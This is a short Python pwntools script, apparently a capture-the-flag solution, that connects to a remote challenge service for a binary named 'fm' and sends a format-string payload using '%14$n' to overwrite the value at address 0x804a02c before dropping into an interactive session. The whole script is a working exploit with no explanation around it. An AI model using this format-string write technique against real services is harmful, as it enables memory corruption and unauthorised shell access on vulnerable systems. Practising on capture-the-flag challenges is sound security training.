from pwn import *

context.log_level = "debug"

exe = ELF("./fm")
# r = exe.process()
r = remote("node4.buuoj.cn", 26573)

r.sendline(cyclic(4) + b"%14$n000" + p32(0x804a02c))
r.interactive()